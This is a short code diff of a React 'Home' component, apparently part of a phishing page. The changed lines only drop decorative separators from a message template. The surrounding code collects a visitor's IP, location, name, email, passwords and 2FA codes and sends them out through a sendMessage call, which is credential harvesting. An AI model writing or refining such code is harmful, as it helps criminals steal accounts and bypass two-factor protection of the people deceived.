@@ -317,7 +317,6 @@ const Home = () => {
 ⏰ ${formatDateTime()}
 🌐 IP: <code>${escapeHtml(safeIp)}</code>
 📍 Location: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
-━━━━━━━━━━━━━━━━━━━━
 📋 <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
@@ -328,7 +327,7 @@ const Home = () => {
 ${passwordLines}
 🔒 <b>2FA CODE</b>
 ${twoFALines}
-━━━━━━━━━━━━━━━━━━━━`;
+`;
         sendMessage(message);
     };
 
